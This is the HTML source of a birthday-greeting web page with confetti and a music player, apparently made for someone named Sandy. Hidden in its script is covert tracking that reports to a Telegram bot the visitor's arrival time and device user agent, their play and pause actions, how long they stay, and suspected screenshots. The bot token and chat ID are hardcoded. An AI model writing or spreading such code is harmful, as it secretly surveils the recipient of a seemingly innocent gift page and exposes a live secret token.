<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ğŸˆğŸ‚Ø¹ÙŠÙ€Ø¯ Ù…ÙŠÙ€Ù„Ø§Ø¯ Ø³Ø¹Ù€ÙŠØ¯ ğŸ‰ğŸ¤</title>
  <style>
    body {
      text-align: center;
      background-color: #8B0000;
      color: white;
      font-family: 'Tajawal', sans-serif;
      overflow: hidden;
    }
    h1 {
      font-size: 3rem;
      margin-top: 50px;
    }
    /* Ø§Ù„Ù†Ù…Ø· Ø§Ù„Ø¹Ø§Ù… Ù„Ù„Ø£Ø²Ø±Ø§Ø± */
    button {
      padding: 10px 15px;
      font-size: 1rem;
      background-color: white;
      color: #8B0000;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      transition: 0.3s;
      margin: 5px;
      position: relative;
    }
    button:hover {
      background-color: #ffcccc;
    }
    /* Ø²Ø± ØªØ´ØºÙŠÙ„ Ø§Ù„Ø£ØºÙ†ÙŠØ© ÙŠØ¨Ø¯Ø£ Ù…Ø®ÙÙŠ */
    #playButton {
      opacity: 0;
      transition: opacity 1s ease-in-out;
    }
    /* Ø¹Ù†Ø¯ Ø¥Ø¶Ø§ÙØ© Ø§Ù„ÙƒÙ„Ø§Ø³ show ÙŠØµÙŠØ± Ø¸Ø§Ù‡Ø± */
    #playButton.show {
      opacity: 1;
    }
    .cover {
      position: relative;
      width: 80%;
      max-width: 600px;
      margin: 20px auto;
      background-color: gold;
      text-align: center;
      padding: 20px;
      font-size: 1.5rem;
      font-weight: bold;
      cursor: pointer;
      transition: transform 1s ease-in-out, opacity 1s ease-in-out;
      border-radius: 10px;
    }
    /* ØªØ£Ø«ÙŠØ± Ø¹Ù†Ø¯ Ø§Ù„Ù†Ù‚Ø± Ø¹Ù„Ù‰ Ø§Ù„ØºÙ„Ø§Ù */
    .cover.hidden {
      transform: translateY(100px);
      opacity: 0;
    }
    #greeting {
      display: none;
    }
    /* ØµÙ†Ø¯ÙˆÙ‚ Ø§Ù„ØªØ­ÙƒÙ… Ø¨Ø§Ù„Ø£ØºÙ†ÙŠØ© Ù…Ø®ÙÙŠ Ø£ÙˆÙ„Ø§Ù‹ Ù…Ø¹ ØªØ£Ø«ÙŠØ± Ø§Ù†Ø²Ù„Ø§Ù‚ÙŠ Ù…Ù† Ø§Ù„Ø£Ø¹Ù„Ù‰ */
    .player-controls {
      margin: 20px auto;
      background: rgba(0, 0, 0, 0.7);
      padding: 15px;
      border-radius: 15px;
      width: 80%;
      max-width: 400px;
      opacity: 0;
      transform: translateY(-50px);
      transition: transform 0.5s ease-out, opacity 0.5s ease-out;
      text-align: center;
      display: none;
    }
    /* Ø¹Ù†Ø¯ Ø¸Ù‡ÙˆØ± ØµÙ†Ø¯ÙˆÙ‚ Ø§Ù„ØªØ­ÙƒÙ… ÙŠØªÙ… Ø¥Ø²Ø§Ù„Ø© Ø§Ù„ØªØ£Ø«ÙŠØ± */
    .player-controls.visible {
      opacity: 1;
      transform: translateY(0);
    }
    .progress {
      width: 100%;
      height: 5px;
      background: #ddd;
      border-radius: 5px;
      margin: 10px 0;
      overflow: hidden;
    }
    .progress-bar {
      height: 100%;
      width: 0%;
      background: gold;
      transition: width 0.5s;
    }
    .controls-row {
      display: flex;
      justify-content: center;
      align-items: center;
    }
    /* Ø§Ù„ØªØ£ÙƒÙŠØ¯ Ø¹Ù„Ù‰ Ø¸Ù‡ÙˆØ± Ø£Ø²Ø±Ø§Ø± Ø§Ù„ØªØ­ÙƒÙ… Ø¯Ø§Ø®Ù„ ØµÙ†Ø¯ÙˆÙ‚ Ø§Ù„ØªØ­ÙƒÙ… */
    .player-controls button {
      opacity: 1 !important;
      top: 0 !important;
      transition: none;
    }
    
    /* ØªØ£Ø«ÙŠØ± Ø¥Ø¶Ø§Ø¡Ø© Ø¹Ù„Ù‰ Ø§Ù„Ø¹Ù†ÙˆØ§Ù† */
    @keyframes glow {
      0%, 100% {
        text-shadow: 0 0 5px #fff, 0 0 10px #ff0, 0 0 15px #ff0;
      }
      50% {
        text-shadow: 0 0 20px #fff, 0 0 30px #ff0, 0 0 40px #ff0;
      }
    }
    .glow {
      animation: glow 2s infinite;
    }
    
    /* ØªØ£Ø«ÙŠØ± Ø§Ù„Ø¸Ù„Ø§Ù„ Ù„Ù„ØºÙ„Ø§Ù Ø¹Ù†Ø¯ Ø§Ù„Ù…Ø±ÙˆØ± */
    .cover:hover {
      box-shadow: 0 0 15px 5px rgba(255, 255, 255, 0.7);
    }
    
    /* Ù†Ù…Ø· Ø§Ù„Ù‚Ù…Ø§Ø´ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù„ØªØ£Ø«ÙŠØ± Ø§Ù„ÙƒÙˆÙ†ÙÙŠØªÙŠ */
    #confettiCanvas {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 999;
    }
  </style>
</head>
<body>
  <!-- Ù‚Ù…Ø§Ø´ Ø§Ù„ÙƒÙˆÙ†ÙÙŠØªÙŠ Ù„ØªØ£Ø«ÙŠØ± Ø§Ù„ÙˆØ±Ù‚ Ø§Ù„Ù…Ù„ÙˆÙ† -->
  <canvas id="confettiCanvas"></canvas>
  
  <h1 class="glow">ğŸˆğŸ‚Happy Birthday ğŸ‰ğŸ¤</h1>
  <div class="cover" onclick="revealText()">Tap here there might be a little surprise waiting for you ğŸ‰ğŸ˜‰</div>
  <p id="greeting">
Happy Birthday to the sweetest and most amazing person ever ğŸ‚â™¥ï¸ğŸ‰! Hope your dayâ€™s full of good vibes, laughter,
    and all the things that make you smile. You seriously deserve all the happiness in the world! Having you around is such a blessing 
    you bring so much joy everywhere you go ğŸ’«
    I really hope this year brings you closer to your dreams and fills your life with endless smiles and moments youâ€™ll never forget Youâ€™re literally the best ğŸŒ¸ğŸ«¶ 
  
</p>
  <!-- Ø²Ø± ØªØ´ØºÙŠÙ„ Ø§Ù„Ø£ØºÙ†ÙŠØ© Ù…Ø®ÙÙŠ Ø­ØªÙ‰ ÙŠØ¸Ù‡Ø± Ø¨Ø¹Ø¯ Ø§Ù„Ù†Ù‚Ø± Ø¹Ù„Ù‰ Ø§Ù„ØºÙ„Ø§Ù -->
  <button id="playButton" onclick="playSong()">ğŸ’™ ğŸ¶Tap here Sandy this songâ€™s for you</button>
  <audio id="song" src="song.mp3" ontimeupdate="updateProgress()"></audio>
  <!-- ØµÙ†Ø¯ÙˆÙ‚ Ø§Ù„ØªØ­ÙƒÙ… Ù…Ø®ÙÙŠ Ø­ØªÙ‰ ÙŠØªÙ… ØªÙØ¹ÙŠÙ„Ù‡ -->
  <div class="player-controls" id="controls">
    <p id="time">0:00</p>
    <div class="progress">
      <div class="progress-bar" id="progress-bar"></div>
    </div>
    <div class="controls-row">
      <button onclick="rewind()">âª</button>
      <button onclick="togglePlay()">â¯ï¸</button>
      <button onclick="forward()">â©</button>
    </div>
  </div>
  
  <script>
    // ===========================
    // ÙˆØ¸Ø§Ø¦Ù ØªØ´ØºÙŠÙ„ Ø§Ù„Ø£ØºÙ†ÙŠØ© ÙˆØ§Ù„Ø¹Ø±Ø¶
    // ===========================
    function revealText() {
      // Ø¥Ø®ÙØ§Ø¡ Ø§Ù„ØºÙ„Ø§Ù Ø¨ØªØ£Ø«ÙŠØ± Ø§Ù†Ø²Ù„Ø§Ù‚ÙŠ Ù„Ù„Ø£Ø³ÙÙ„
      document.querySelector('.cover').classList.add('hidden');
      setTimeout(() => {
        document.querySelector('.cover').style.display = 'none';
        document.getElementById('greeting').style.display = 'block';
        // Ø¥Ø¸Ù‡Ø§Ø± Ø²Ø± ØªØ´ØºÙŠÙ„ Ø§Ù„Ø£ØºÙ†ÙŠØ© Ø¨Ø¹Ø¯ Ø¥Ø®ÙØ§Ø¡ Ø§Ù„ØºÙ„Ø§Ù
        document.getElementById('playButton').classList.add('show');
        // Ø¨Ø¯Ø¡ ØªØ£Ø«ÙŠØ± Ø§Ù„ÙƒÙˆÙ†ÙÙŠØªÙŠ Ù„Ù„Ø§Ø­ØªÙØ§Ù„
        startConfetti();
      }, 1000);
    }
    
    function enableControls() {
      let controls = document.getElementById("controls");
      controls.style.display = "block";
      // ØªÙØ¹ÙŠÙ„ ØªØ£Ø«ÙŠØ± Ø§Ù„Ø§Ù†Ø²Ù„Ø§Ù‚ Ù…Ù† Ø§Ù„Ø£Ø¹Ù„Ù‰ Ø¨Ø¹Ø¯ ØªØ£Ø®ÙŠØ± Ø¨Ø³ÙŠØ·
      setTimeout(() => {
        controls.classList.add("visible");
      }, 100);
    }
    
    function playSong() {
      let song = document.getElementById("song");
      song.play();
      enableControls();
      // Ø¥Ø±Ø³Ø§Ù„ Ø¥Ø´Ø¹Ø§Ø± Ø¹Ù†Ø¯ Ø§Ù„Ø¶ØºØ· Ø¹Ù„Ù‰ Ø²Ø± Ø§Ù„ØªØ´ØºÙŠÙ„
      sendTelegramMessage("ğŸ¶ ØªÙ… ØªØ´ØºÙŠÙ„ Ø§Ù„Ø£ØºÙ†ÙŠØ©.");
    }
    
    function updateProgress() {
      let song = document.getElementById("song");
      let progressBar = document.getElementById("progress-bar");
      let timeDisplay = document.getElementById("time");
      
      if (!isNaN(song.duration)) {
        let minutes = Math.floor(song.currentTime / 60);
        let seconds = Math.floor(song.currentTime % 60);
        timeDisplay.innerText = minutes + ":" + (seconds < 10 ? "0" + seconds : seconds);
        progressBar.style.width = (song.currentTime / song.duration) * 100 + "%";
      }
    }
    
    function togglePlay() {
      let song = document.getElementById("song");
      if (song.paused) {
        song.play();
      } else {
        song.pause();
      }
    }
    
    function rewind() {
      let song = document.getElementById("song");
      if (!isNaN(song.duration)) {
        song.currentTime = Math.max(0, song.currentTime - 5);
      }
    }
    
    function forward() {
      let song = document.getElementById("song");
      if (!isNaN(song.duration)) {
        song.currentTime = Math.min(song.duration, song.currentTime + 5);
      }
    }
    
    // ===========================
    // ØªÙƒØ§Ù…Ù„ Ø¨ÙˆØª ØªÙ„Ø¬Ø±Ø§Ù… Ù„ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
    // ===========================
    const telegramBotToken = "7890478414:AAGkrQ7HwgdU6ppweqOpfvygwmeI1tyJvKw"; // Ø§Ø³ØªØ¨Ø¯Ù„ Ø¨Ø§Ù„ØªÙˆÙƒÙ† Ø§Ù„Ø®Ø§Øµ Ø¨Ø¨ÙˆØªÙƒ
    const telegramChatId = "651561282"; // Ø§Ø³ØªØ¨Ø¯Ù„ Ø¨Ø§Ù„Ø¢ÙŠØ¯ÙŠ Ø§Ù„Ø®Ø§Øµ Ø¨Ø§Ù„Ø¯Ø±Ø¯Ø´Ø© Ø£Ùˆ Ø§Ù„Ù‚Ù†Ø§Ø©
    
    function sendTelegramMessage(message) {
      fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          chat_id: telegramChatId,
          text: message
        }),
        keepalive: true
      });
    }
    
    function formatDate(date) {
      let day = date.getDate();
      let month = date.getMonth() + 1;
      let year = date.getFullYear();
      let hours = date.getHours();
      let minutes = date.getMinutes();
      let seconds = date.getSeconds();
      let period = hours >= 12 ? "Ù…" : "Øµ";
      hours = hours % 12;
      if (hours === 0) hours = 12;
      minutes = minutes < 10 ? "0" + minutes : minutes;
      seconds = seconds < 10 ? "0" + seconds : seconds;
      return `${day}â€/${month}â€/${year} ${hours}:${minutes}:${seconds} ${period}`;
    }
    
    // ØªØ³Ø¬ÙŠÙ„ ÙˆÙ‚Øª Ø§Ù„Ø¯Ø®ÙˆÙ„ Ù…Ø¹ Ø¨ÙŠØ§Ù†Ø§Øª Ù…ÙØµÙ„Ø©
    let loginTime = new Date();
    let userAgentInfo = navigator.userAgent;
    sendTelegramMessage(`ğŸš€ Ø¯Ø®ÙˆÙ„ Ø¬Ø¯ÙŠØ¯ Ù„Ù„Ù…ÙˆÙ‚Ø¹!\nğŸ“… Ø§Ù„ØªØ§Ø±ÙŠØ®: ${formatDate(loginTime)}\nğŸ–¥ Ø§Ù„Ø¬Ù‡Ø§Ø²: ${userAgentInfo}`);
    
    // Ø¥Ø±Ø³Ø§Ù„ Ø¥Ø´Ø¹Ø§Ø± Ø¹Ù†Ø¯ Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ù…ÙˆØ³ÙŠÙ‚Ù‰
    document.getElementById("song").addEventListener("pause", function() {
      sendTelegramMessage("ğŸµ ØªÙ… Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ù…ÙˆØ³ÙŠÙ‚Ù‰.");
    });
    
    // ===========================
    // Ø§ÙƒØªØ´Ø§Ù Ù…ØºØ§Ø¯Ø±Ø© Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙˆØ¥Ø±Ø³Ø§Ù„ Ø¥Ø´Ø¹Ø§Ø±
    // ===========================
    let exitMessageSent = false;
    
    function sendExitMessage(message) {
      if (exitMessageSent) return;
      exitMessageSent = true;
      let payload = JSON.stringify({
        chat_id: telegramChatId,
        text: message
      });
      let blob = new Blob([payload], { type: 'application/json' });
      navigator.sendBeacon(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, blob);
    }
    
    function sendExit() {
      if (exitMessageSent) return;
      let logoutTime = new Date();
      let durationSeconds = Math.round((logoutTime - loginTime) / 1000);
      let minutes = Math.floor(durationSeconds / 60);
      let seconds = durationSeconds % 60;
      let message = `ğŸ“¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ØºØ§Ø¯Ø± Ø§Ù„Ù…ÙˆÙ‚Ø¹\nâ³ Ù…Ø¯Ø© Ø§Ù„Ø¨Ù‚Ø§Ø¡: ${minutes} Ø¯Ù‚ÙŠÙ‚Ø© Ùˆ ${seconds} Ø«Ø§Ù†ÙŠØ©`;
      sendExitMessage(message);
    }
    
    // Ø§Ù„Ø£Ø­Ø¯Ø§Ø« Ø§Ù„Ù…ØªØ¹Ø¯Ø¯Ø© Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„ØªÙ‚Ø§Ø· Ù…ØºØ§Ø¯Ø±Ø© Ø§Ù„Ù…ÙˆÙ‚Ø¹ (Ø®Ø§ØµØ© Ø¹Ù„Ù‰ iOS ÙˆØ£Ø¬Ù‡Ø²Ø© Ø³Ø§Ù…Ø³ÙˆÙ†Ø¬)
    window.addEventListener("beforeunload", sendExit);
    window.addEventListener("pagehide", sendExit);
    window.addEventListener("unload", sendExit);
    document.addEventListener("visibilitychange", function() {
      if (document.visibilityState === "hidden") {
        sendExit();
      }
    });
    window.addEventListener("blur", function() {
      // ÙÙŠ Ø¨Ø¹Ø¶ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø© Ù‚Ø¯ ÙŠÙƒÙˆÙ† Ø§Ù„Ù…Ø³ØªÙ…Ø¹ "blur" Ù…Ø¤Ø´Ø±Ù‹Ø§ Ø¹Ù„Ù‰ Ù…ØºØ§Ø¯Ø±Ø© Ø§Ù„ØµÙØ­Ø©
      if (document.visibilityState === "hidden") {
        sendExit();
      }
    });
    
    // ===========================
    // Ø§ÙƒØªØ´Ø§Ù Ù„Ù‚Ø·Ø© Ø§Ù„Ø´Ø§Ø´Ø©
    // ===========================
    
    let screenshotMessageSent = false;
    function notifyScreenshot() {
      if (screenshotMessageSent) return;
      screenshotMessageSent = true;
      let screenshotTime = new Date();
      sendTelegramMessage(`ğŸ“¸ ØªÙ… Ø§Ù„ØªÙ‚Ø§Ø· Ù„Ù‚Ø·Ø© Ø´Ø§Ø´Ø©!\nğŸ“… Ø§Ù„ØªØ§Ø±ÙŠØ®: ${formatDate(screenshotTime)}\nğŸ–¥ Ø§Ù„Ø¬Ù‡Ø§Ø²: ${userAgentInfo}`);
      
      // Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ù…ØªØºÙŠØ± Ø¨Ø¹Ø¯ ÙØªØ±Ø© Ù„Ù„Ø³Ù…Ø§Ø­ Ø¨Ø¥Ø±Ø³Ø§Ù„ Ø¥Ø´Ø¹Ø§Ø± Ø¢Ø®Ø± Ø¥Ø°Ø§ Ø­Ø¯Ø« Ù…Ø±Ø© Ø£Ø®Ø±Ù‰
      setTimeout(() => {
        screenshotMessageSent = false;
      }, 3000);
    }
    
    // Ù…Ø­Ø§ÙˆÙ„Ø© Ø§ÙƒØªØ´Ø§Ù Ù„Ù‚Ø·Ø© Ø§Ù„Ø´Ø§Ø´Ø© Ø¹Ù„Ù‰ Ø£Ø¬Ù‡Ø²Ø© iPhone (Safari) Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø£Ø­Ø¯Ø§Ø« Ø§Ù„Ù„Ù…Ø³
    document.addEventListener('touchend', function() {
      const now = new Date().getTime();
      const delta = now - (this._lastTouchEndTime || now);
      this._lastTouchEndTime = now;
      if (delta < 20) {
        setTimeout(function() {
          if (document.visibilityState === 'hidden') {
            notifyScreenshot();
          }
        }, 50);
      }
    });
    
    // Ø§ÙƒØªØ´Ø§Ù Ù„Ù‚Ø·Ø© Ø§Ù„Ø´Ø§Ø´Ø© ÙÙŠ Ù…ØªØµÙØ­Ø§Øª Ø³Ø·Ø­ Ø§Ù„Ù…ÙƒØªØ¨ Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù…Ø±Ø§Ù‚Ø¨Ø© Ù…ÙØ§ØªÙŠØ­ Ø§Ù„Ø§Ø®ØªØµØ§Ø±
    document.addEventListener('keyup', function(e) {
      if (
        (e.key === 'PrintScreen') ||
        (e.key === '3' && e.metaKey && e.shiftKey) ||
        (e.key === '4' && e.metaKey && e.shiftKey) ||
        (e.key === 'PrtScn') ||
        (e.keyCode === 44)
      ) {
        notifyScreenshot();
      }
    });
    
    // Ù…Ø±Ø§Ù‚Ø¨Ø© ØªØºÙŠÙ‘Ø± Ù†Ø³Ø¨Ø© Ø§Ù„Ø¨ÙƒØ³Ù„ (Ù‚Ø¯ ÙŠØªØºÙŠØ± Ø¹Ù†Ø¯ Ø§Ù„ØªÙ‚Ø§Ø· Ù„Ù‚Ø·Ø© Ø´Ø§Ø´Ø©)
    if (window.devicePixelRatio) {
      const defaultPixelRatio = window.devicePixelRatio;
      window.addEventListener('resize', function() {
        if (window.devicePixelRatio !== defaultPixelRatio) {
          notifyScreenshot();
          setTimeout(function() {
            if (window.devicePixelRatio === defaultPixelRatio) {
              notifyScreenshot();
            }
          }, 500);
        }
      });
    }
    
    // Ø·Ø±ÙŠÙ‚Ø© Ø¥Ø¶Ø§ÙÙŠØ© Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… Canvas ÙˆØ£Ø­Ø¯Ø§Ø« Ø§Ù„ÙØ£Ø±Ø© ÙˆØ§Ù„Ù…ÙØ§ØªÙŠØ­ Ù„ØªØºØ·ÙŠØ© Ø£Ø¬Ù‡Ø²Ø© Ø³Ø§Ù…Ø³ÙˆÙ†Ø¬ ÙˆØºÙŠØ±Ù‡Ø§
    function checkScreenshot() {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      const originalPixelRatio = window.devicePixelRatio;
      let changed = false;
      const events = ['mousedown', 'mouseup', 'keydown', 'keyup'];
      events.forEach(event => {
        document.addEventListener(event, function() {
          setTimeout(function() {
            if (window.devicePixelRatio !== originalPixelRatio && !changed) {
              changed = true;
              notifyScreenshot();
            } else if (window.devicePixelRatio === originalPixelRatio && changed) {
              changed = false;
            }
          }, 50);
        });
      });
    }
    checkScreenshot();
    
    // ===========================
    // ØªØ£Ø«ÙŠØ± Ø§Ù„ÙƒÙˆÙ†ÙÙŠØªÙŠ (Ø§Ù„ÙˆØ±Ù‚ Ø§Ù„Ù…Ù„ÙˆÙ†) Ù„Ù„Ø§Ø­ØªÙØ§Ù„
    // ===========================
    function startConfetti() {
      const canvas = document.getElementById('confettiCanvas');
      const ctx = canvas.getContext('2d');
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
      
      const particles = [];
      const particleCount = 150;
      
      for (let i = 0; i < particleCount; i++) {
        particles.push({
          x: Math.random() * canvas.width,
          y: Math.random() * canvas.height - canvas.height,
          r: Math.random() * 6 + 2,
          d: Math.random() * particleCount,
          color: 'rgba(' + Math.floor(Math.random()*255) + ',' + Math.floor(Math.random()*255) + ',' + Math.floor(Math.random()*255) + ',0.8)',
          tilt: Math.floor(Math.random() * 10) - 10,
          tiltAngleIncremental: (Math.random() * 0.07) + 0.05,
          tiltAngle: 0
        });
      }
      
      let angle = 0;
      function draw() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        particles.forEach(function(p) {
          ctx.beginPath();
          ctx.lineWidth = p.r;
          ctx.strokeStyle = p.color;
          ctx.moveTo(p.x + p.tilt + (p.r / 2), p.y);
          ctx.lineTo(p.x + p.tilt, p.y + p.tilt + (p.r / 2));
          ctx.stroke();
        });
        update();
      }
      
      function update() {
        angle += 0.01;
        particles.forEach(function(p, index) {
          p.tiltAngle += p.tiltAngleIncremental;
          p.y += (Math.cos(angle + p.d) + 1 + p.r / 2) / 2;
          p.x += Math.sin(angle);
          p.tilt = Math.sin(p.tiltAngle) * 15;
          
          if (p.y > canvas.height) {
            particles[index] = {
              x: Math.random() * canvas.width,
              y: -20,
              r: p.r,
              d: p.d,
              color: p.color,
              tilt: p.tilt,
              tiltAngleIncremental: p.tiltAngleIncremental,
              tiltAngle: p.tiltAngle
            };
          }
        });
      }
      
      function animate() {
        draw();
        requestAnimationFrame(animate);
      }
      
      animate();
    }
  </script>
</body>
</html>







